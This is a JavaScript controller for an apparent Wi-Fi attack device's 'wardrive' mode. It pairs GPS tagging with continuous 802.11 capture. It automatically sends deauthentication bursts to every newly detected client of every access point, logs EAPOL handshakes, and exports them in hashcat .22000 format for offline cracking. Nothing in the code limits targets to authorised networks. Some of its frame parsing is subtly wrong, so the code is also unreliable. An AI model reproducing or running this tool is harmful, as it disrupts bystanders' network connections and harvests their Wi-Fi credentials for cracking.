// wardrive.js — Wardrive mode controller.
//
// States: IDLE, STARTING, CAPTURING, STOPPING
// Uses GPS for tagging, transport for continuous capture, auto-analyzes frames
// for AP+client associations, fires deauth bursts, and detects handshakes.
//
// Requires: transport, request(), Icon, log() injected via the exported API.
// Mounted to window.Wardrive.

(function () {
  'use strict';

  const STATE = { IDLE: 'IDLE', STARTING: 'STARTING', CAPTURING: 'CAPTURING', STOPPING: 'STOPPING' };

  // In-memory maps for seen APs and associated clients
  let seenAPs = new Map();   // bssid -> {ssid, channel, frames, clients: Set<mac>}
  let deauthQueue = [];      // [{bssid, client}]
  let lastDeauthTime = 0;
  let handshakeCount = 0;
  let frameCount = 0;
  let deauthCount = 0;
  let state = STATE.IDLE;

  // Injected dependencies
  let _request = null;
  let _log = null;
  let _icon = null;
  let _gps = null;
  let _hashStore = null;

  // UI element references (set during init)
  let $wardriveBtn = null;
  let $wardriveStatus = null;
  let $gpsStatus = null;
  let $wFrames = null;
  let $wAPs = null;
  let $wDeauths = null;
  let $wHandshakes = null;
  let $wDuration = null;
  let $wardriveLog = null;

  let pollTimer = null;
  let startTime = null;
  let sessionDurationTimer = null;

  // ── init ─────────────────────────────────────────────────────────────────────

  /**
   * Set up UI references and bind button handlers.
   * deps: { request, log, icon }
   */
  function init(deps) {
    _request = deps.request;
    _log = deps.log;
    _icon = deps.icon || (() => '');
    _gps = deps.gps || window.GPS;
    _hashStore = deps.hashStore || window.HashStore;

    $wardriveBtn = document.getElementById('wardriveBtn');
    $wardriveStatus = document.getElementById('wardriveStatus');
    $gpsStatus = document.getElementById('gpsStatus');
    $wFrames = document.getElementById('wFrames');
    $wAPs = document.getElementById('wAPs');
    $wDeauths = document.getElementById('wDeauths');
    $wHandshakes = document.getElementById('wHandshakes');
    $wDuration = document.getElementById('wDuration');
    $wardriveLog = document.getElementById('wardriveLog');

    if ($wardriveBtn) {
      $wardriveBtn.addEventListener('click', () => {
        if (state === STATE.IDLE) {
          start();
        } else if (state === STATE.CAPTURING) {
          stop();
        }
      });
    }
  }

  // ── state helpers ────────────────────────────────────────────────────────────

  function isRunning() {
    return state === STATE.CAPTURING || state === STATE.STARTING;
  }

  function getState() {
    return state;
  }

  // ── start / stop ─────────────────────────────────────────────────────────────

  async function start() {
    if (state !== STATE.IDLE) return;
    state = STATE.STARTING;
    updateUI();
    logWardrive('Starting wardrive…');

    try {
      // 1. Start GPS
      _gps.startTracking(onGpsUpdate);

      // 2. Send start_cont_capture command
      if (_request) {
        const resp = await _request('START_CONT_CAPTURE', undefined, { timeoutMs: 5000 });
        if (!resp || !resp.ok) {
          throw new Error(resp?.error || 'board refused continuous capture');
        }
        logWardrive('Continuous capture started');
      }

      // 3. Begin poll loop
      state = STATE.CAPTURING;
      startTime = Date.now();
      resetStats();
      startSessionTimer();
      pollLoop();
      updateUI();
      if (_log) _log('ev', 'wardrive started');
    } catch (e) {
      logWardrive('Error: ' + e.message);
      if (_log) _log('err', 'wardrive start: ' + e.message);
      // Clean up GPS
      _gps.stopTracking();
      state = STATE.IDLE;
      updateUI();
    }
  }

  async function stop() {
    if (state !== STATE.CAPTURING) return;
    state = STATE.STOPPING;
    updateUI();
    logWardrive('Stopping wardrive…');

    // 1. Stop poll loop
    if (pollTimer) {
      clearTimeout(pollTimer);
      pollTimer = null;
    }
    if (sessionDurationTimer) {
      clearInterval(sessionDurationTimer);
      sessionDurationTimer = null;
    }

    // 2. Send stop_cont_capture
    try {
      if (_request) {
        const resp = await _request('STOP_CONT_CAPTURE', undefined, { timeoutMs: 3000 });
        if (resp && _log) _log('ev', 'wardrive: continuous capture stopped');
      }
    } catch (e) {
      if (_log) _log('err', 'wardrive stop: ' + e.message);
    }

    // 3. Stop GPS
    _gps.stopTracking();

    // 4. Save session via HashStore
    const sessionId = _hashStore.getCurrentSession();
    logWardrive('Session saved: ' + sessionId);

    // 5. Show export dialog
    showExportDialog(sessionId);

    state = STATE.IDLE;
    updateUI();
    if (_log) _log('ev', 'wardrive stopped — ' + frameCount + ' frames, ' + handshakeCount + ' handshakes');
  }

  // ── poll loop ────────────────────────────────────────────────────────────────

  async function pollLoop() {
    if (state !== STATE.CAPTURING) return;

    try {
      if (!_request) return;

      // 1. Send get_segment command
      const resp = await _request('GET_SEGMENT', undefined, { timeoutMs: 2000 });

      if (resp && resp.segment) {
        // Parse returned PCAP frames
        const frames = parseSegment(resp.segment);
        if (frames.length > 0) {
          frameCount += frames.length;
          await autoAnalyze(frames);
        }
      }

      // 2. Auto deauth
      await autoDeauth();

    } catch (e) {
      // Link busy or timed out — normal during heavy capture
      if (e.message && e.message.includes('timed out')) {
        // expected occasionally
      }
    }

    updateUI();

    // Schedule next poll
    if (state === STATE.CAPTURING) {
      pollTimer = setTimeout(pollLoop, 250);
    }
  }

  // ── segment parsing ──────────────────────────────────────────────────────────

  /**
   * Parse a raw segment (base64 or Uint8Array) into individual frame bytes.
   * The segment from the board is raw 802.11 frames concatenated.
   * We split on retry limit — for this implementation, treat the whole segment
   * as one frame blob and analyze it.
   * Returns array of Uint8Array frames.
   */
  function parseSegment(segment) {
    if (!segment) return [];
    // segment is an object from JSON — could be hex, base64, or {data, len}
    let bytes;
    if (typeof segment === 'string') {
      // Might be hex string or base64
      if (/^[0-9a-fA-F]+$/.test(segment)) {
        bytes = hexToBytes(segment);
      } else {
        // Base64
        try {
          bytes = base64ToBytes(segment);
        } catch {
          return [];
        }
      }
    } else if (segment.data && typeof segment.data === 'string') {
      bytes = base64ToBytes(segment.data);
    } else if (segment instanceof Array) {
      bytes = new Uint8Array(segment);
    } else {
      return [];
    }

    if (!bytes || bytes.length < 24) return [];

    // Simple split: if we have multiple frames concatenated, separate by
    // frame control fields. Each 802.11 frame starts with a 2-byte Frame
    // Control, and minimum frame size is 24 bytes.
    const frames = [];
    let offset = 0;
    while (offset + 24 <= bytes.length) {
      // Try to determine the frame length from the Length field in
      // radiotap header if present, or just take available data
      const frameLen = Math.min(1500, bytes.length - offset);
      frames.push(bytes.slice(offset, offset + frameLen));
      offset += frameLen;
    }
    return frames;
  }

  // ── auto analyze ─────────────────────────────────────────────────────────────

  async function autoAnalyze(frames) {
    for (const frameBytes of frames) {
      if (frameBytes.length < 24) continue;

      const frameControl = (frameBytes[0] << 8) | frameBytes[1];
      const type = (frameControl >> 2) & 0x03;
      const subtype = (frameControl >> 4) & 0x0f;

      // Extract MAC addresses
      // addr1 = receiver (offset 4-10), addr2 = transmitter (offset 10-16), addr3 = (offset 16-22)
      const addr2 = macFromBytes(frameBytes, 10);  // transmitter
      const addr1 = macFromBytes(frameBytes, 4);   // receiver
      const addr3 = macFromBytes(frameBytes, 16);  // BSSID for some frames

      if (!addr2) continue;

      if (type === 0) {
        // Management frames
        if (subtype === 8) {
          // Beacon — addr3 is BSSID
          const bssid = addr3 || addr2;
          const ssid = extractSSID(frameBytes);
          const channel = extractChannel(frameBytes);
          if (!seenAPs.has(bssid)) {
            seenAPs.set(bssid, { ssid, channel, frames: 0, clients: new Set() });
          }
          const ap = seenAPs.get(bssid);
          ap.frames++;
          if (ssid) ap.ssid = ssid;
          if (channel) ap.channel = channel;
        }
      } else if (type === 1) {
        // Control frames
        if (subtype === 10 || subtype === 12) {
          // PS-Poll / CF-End — not interesting for deauth
        }
      } else if (type === 2) {
        // Data frames
        // addr1 = receiver (often the AP or client)
        // addr2 = transmitter
        const bssid = addr3 || addr2;
        const client = addr1;

        if (bssid && client && bssid !== client && bssid !== 'ff:ff:ff:ff:ff:ff') {
          if (!seenAPs.has(bssid)) {
            seenAPs.set(bssid, { ssid: null, channel: null, frames: 0, clients: new Set() });
          }
          const ap = seenAPs.get(bssid);
          ap.frames++;

          // Check for new association (client not yet seen on this AP)
          if (!ap.clients.has(client) && client !== 'ff:ff:ff:ff:ff:ff') {
            ap.clients.add(client);
            // Queue for deauth
            deauthQueue.push({ bssid, client });
          }
        }

        // Handshake detection (EAPOL — EtherType 0x888E)
        const etherType = (frameBytes[24] << 8) | frameBytes[25];
        if (etherType === 0x888E) {
          handshakeCount++;
          // EAPOL frame found — save the raw segment bytes
          // The .22000 extraction is done offline from the pcap
          logWardrive('Handshake detected! (' + bssid + ')');

          // Also store a hash placeholder in HashStore
          const gps = _gps && _gps.position;
          const ap = seenAPs.get(bssid);
          _hashStore.addHash(
            'HANDSHAKE_' + bssid.replace(/:/g, ''),
            bssid,
            ap?.ssid || '(unknown)',
            ap?.channel || 0,
            gps?.lat || null,
            gps?.lon || null,
            gps?.accuracy || null
          );
        }
      }
    }
  }

  // ── auto deauth ──────────────────────────────────────────────────────────────

  async function autoDeauth() {
    const now = Date.now();
    if (deauthQueue.length === 0) return;
    if (now - lastDeauthTime < 500) return;

    const target = deauthQueue.shift();
    if (!target) return;

    try {
      if (!_request) return;

      // Build deauth frames for BSSID -> client
      const hexBssid = target.bssid.replace(/:/g, '');
      const hexClient = target.client.replace(/:/g, '');

      const resp = await _request('DEAUTH_NOW', {
        bssid: hexBssid,
        client: hexClient,
      }, { timeoutMs: 2000 });

      if (resp && resp.ok) {
        deauthCount++;
        lastDeauthTime = now;
        logWardrive('Deauth: ' + target.bssid + ' -> ' + target.client);
      }
    } catch (e) {
      // Transmit may fail — not critical
    }
  }

  // ── handshake detection ─────────────────────────────────────────────────────

  function handshakeDetect(frameBytes) {
    // Already handled inline in autoAnalyze
    return null;
  }

  // ── UI updates ───────────────────────────────────────────────────────────────

  function updateUI() {
    if ($wardriveBtn) {
      if (state === STATE.IDLE) {
        $wardriveBtn.textContent = 'Start Wardrive';
        $wardriveBtn.className = '';
      } else if (state === STATE.CAPTURING) {
        $wardriveBtn.textContent = 'Stop Wardrive';
        $wardriveBtn.className = 'danger';
      } else {
        $wardriveBtn.textContent = state;
        $wardriveBtn.disabled = true;
      }
    }

    if ($wardriveStatus) {
      $wardriveStatus.classList.toggle('hidden', state === STATE.IDLE);
    }

    if ($gpsStatus) {
      const gps = _gps && _gps.position;
      if (gps && gps.lat != null) {
        $gpsStatus.textContent = gps.lat.toFixed(5) + ', ' + gps.lon.toFixed(5) + ' ±' + (gps.accuracy != null ? gps.accuracy.toFixed(0) + 'm' : '?');
        $gpsStatus.style.color = 'var(--ok)';
      } else {
        $gpsStatus.textContent = 'no fix';
        $gpsStatus.style.color = '';
      }
    }

    if ($wFrames) $wFrames.textContent = frameCount;
    if ($wAPs) $wAPs.textContent = seenAPs.size;
    if ($wDeauths) $wDeauths.textContent = deauthCount;
    if ($wHandshakes) $wHandshakes.textContent = handshakeCount;
  }

  function startSessionTimer() {
    if (sessionDurationTimer) clearInterval(sessionDurationTimer);
    sessionDurationTimer = setInterval(() => {
      if ($wDuration && startTime) {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        $wDuration.textContent = elapsed + 's';
      }
    }, 1000);
  }

  function logWardrive(msg) {
    if (!$wardriveLog) return;
    const t = new Date().toLocaleTimeString([], { hour12: false });
    const line = document.createElement('div');
    line.textContent = '[' + t + '] ' + msg;
    $wardriveLog.appendChild(line);
    $wardriveLog.scrollTop = $wardriveLog.scrollHeight;
  }

  function resetStats() {
    seenAPs = new Map();
    deauthQueue = [];
    handshakeCount = 0;
    frameCount = 0;
    deauthCount = 0;
  }

  // ── export dialog ────────────────────────────────────────────────────────────

  function showExportDialog(sessionId) {
    const hasJSON = _hashStore.getSession(sessionId).length > 0;
    const has22000 = _hashStore.export22000(sessionId).length > 0;

    logWardrive('Session ' + sessionId + ': ' +
      _hashStore.getSession(sessionId).length + ' records. ' +
      (has22000 ? '22000 export available.' : 'No handshakes captured.'));

    // Simple export UI appended to wardrive log area
    if ($wardriveLog && hasJSON) {
      const exportNote = document.createElement('div');
      exportNote.style.cssText = 'margin-top:6px;padding:8px;background:var(--surface-2);border-radius:8px;font-size:11px;';
      exportNote.innerHTML =
        '<div style="font-weight:650;margin-bottom:4px;">Export session ' + sessionId + '</div>' +
        '<button id="exportJSONBtn" class="ghost" style="font-size:11px;padding:6px 10px;margin-right:6px;">Export JSON</button>' +
        (has22000 ? '<button id="export22000Btn" class="ghost" style="font-size:11px;padding:6px 10px;">Export .22000</button>' : '');
      $wardriveLog.appendChild(exportNote);
      $wardriveLog.scrollTop = $wardriveLog.scrollHeight;

      // Bind export buttons after they're in the DOM
      setTimeout(() => {
        const jsonBtn = document.getElementById('exportJSONBtn');
        if (jsonBtn) {
          jsonBtn.addEventListener('click', () => {
            const data = _hashStore.exportJSON(sessionId);
            downloadText(data, 'wardrive-' + sessionId + '.json', 'application/json');
          });
        }
        const hcBtn = document.getElementById('export22000Btn');
        if (hcBtn) {
          hcBtn.addEventListener('click', () => {
            const data = _hashStore.export22000(sessionId);
            downloadText(data, 'wardrive-' + sessionId + '.22000', 'text/plain');
          });
        }
      }, 50);
    }
  }

  function downloadText(text, filename, mimeType) {
    const blob = new Blob([text], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  // ── helpers ──────────────────────────────────────────────────────────────────

  function macFromBytes(bytes, offset) {
    if (offset + 6 > bytes.length) return null;
    return Array.from(bytes.subarray(offset, offset + 6))
      .map((b) => b.toString(16).padStart(2, '0'))
      .join(':')
      .toLowerCase();
  }

  function extractSSID(bytes) {
    // Look for SSID parameter element: tag 0x00, then length, then SSID chars
    // Start after fixed header (24 bytes) + optional HT control (4 bytes if QoS)
    const off = 24; // skip fixed 802.11 header
    let i = off;
    while (i + 1 < bytes.length) {
      const tag = bytes[i];
      const len = bytes[i + 1];
      if (tag === 0x00 && len > 0 && i + 2 + len <= bytes.length) {
        return new TextDecoder().decode(bytes.subarray(i + 2, i + 2 + len));
      }
      i += 2 + len;
    }
    return null;
  }

  function extractChannel(bytes) {
    // Look for DS parameter set element: tag 0x03, len 1, channel
    const off = 24;
    let i = off;
    while (i + 1 < bytes.length) {
      const tag = bytes[i];
      const len = bytes[i + 1];
      if (tag === 0x03 && len === 1 && i + 3 <= bytes.length) {
        return bytes[i + 2];
      }
      i += 2 + len;
    }
    return null;
  }

  function hexToBytes(hex) {
    const bytes = new Uint8Array(hex.length / 2);
    for (let i = 0; i < bytes.length; i++) {
      bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
    }
    return bytes;
  }

  function base64ToBytes(b64) {
    const s = atob(b64);
    const bytes = new Uint8Array(s.length);
    for (let i = 0; i < s.length; i++) bytes[i] = s.charCodeAt(i);
    return bytes;
  }

  // ── public API ───────────────────────────────────────────────────────────────

  window.Wardrive = {
    init,
    start,
    stop,
    isRunning,
    getState,
  };
})();